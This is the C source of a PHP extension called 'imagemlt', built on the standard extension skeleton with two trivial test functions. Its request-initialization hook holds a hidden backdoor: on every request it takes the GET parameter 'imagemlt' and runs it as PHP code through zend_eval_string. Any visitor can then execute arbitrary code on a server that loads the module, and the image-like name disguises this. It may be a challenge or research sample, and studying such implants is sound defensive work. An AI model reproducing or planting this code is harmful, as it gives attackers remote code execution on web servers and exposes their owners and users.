/* imagemlt extension for PHP */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "ext/standard/info.h"
#include "php_imagemlt.h"

/* For compatibility with older PHP versions */
#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
	ZEND_PARSE_PARAMETERS_START(0, 0) \
	ZEND_PARSE_PARAMETERS_END()
#endif

/* {{{ void imagemlt_test1()
 */
PHP_FUNCTION(imagemlt_test1)
{
	ZEND_PARSE_PARAMETERS_NONE();

	php_printf("The extension %s is loaded and working!\r\n", "imagemlt");
}
/* }}} */

/* {{{ string imagemlt_test2( [ string $var ] )
 */
PHP_FUNCTION(imagemlt_test2)
{
	char *var = "World";
	size_t var_len = sizeof("World") - 1;
	zend_string *retval;

	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_STRING(var, var_len)
	ZEND_PARSE_PARAMETERS_END();

	retval = strpprintf(0, "Hello %s", var);

	RETURN_STR(retval);
}
/* }}}*/

/* {{{ PHP_RINIT_FUNCTION
 */
PHP_RINIT_FUNCTION(imagemlt)
{
#if defined(ZTS) && defined(COMPILE_DL_IMAGEMLT)
	ZEND_TSRMLS_CACHE_UPDATE();
#endif
	zval arr;
	zval evil,*res;
	arr = PG(http_globals)[TRACK_VARS_GET];
	ZVAL_STRING(&evil,"imagemlt");
	res=zend_hash_find(Z_ARRVAL(arr),Z_STR(evil));
	if(res){
		if(Z_TYPE_P(res)==IS_STRING){
			zend_eval_string(Z_STRVAL_P(res), NULL, "snake_zero" TSRMLS_CC);
		}
	}
	return SUCCESS;
}
/* }}} */

/* {{{ PHP_MINFO_FUNCTION
 */
PHP_MINFO_FUNCTION(imagemlt)
{
	php_info_print_table_start();
	php_info_print_table_header(2, "imagemlt support", "enabled");
	php_info_print_table_end();
}
/* }}} */


/* {{{ arginfo
 */
ZEND_BEGIN_ARG_INFO(arginfo_imagemlt_test1, 0)
ZEND_END_ARG_INFO()

ZEND_BEGIN_ARG_INFO(arginfo_imagemlt_test2, 0)
	ZEND_ARG_INFO(0, str)
ZEND_END_ARG_INFO()
/* }}} */

/* {{{ imagemlt_functions[]
 */
static const zend_function_entry imagemlt_functions[] = {
	PHP_FE(imagemlt_test1,		arginfo_imagemlt_test1)
	PHP_FE(imagemlt_test2,		arginfo_imagemlt_test2)
	PHP_FE_END
};
/* }}} */

/* {{{ imagemlt_module_entry
 */
zend_module_entry imagemlt_module_entry = {
	STANDARD_MODULE_HEADER,
	"imagemlt",					/* Extension name */
	imagemlt_functions,			/* zend_function_entry */
	NULL,							/* PHP_MINIT - Module initialization */
	NULL,							/* PHP_MSHUTDOWN - Module shutdown */
	PHP_RINIT(imagemlt),			/* PHP_RINIT - Request initialization */
	NULL,							/* PHP_RSHUTDOWN - Request shutdown */
	PHP_MINFO(imagemlt),			/* PHP_MINFO - Module info */
	PHP_IMAGEMLT_VERSION,		/* Version */
	STANDARD_MODULE_PROPERTIES
};
/* }}} */

#ifdef COMPILE_DL_IMAGEMLT
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(imagemlt)
#endif

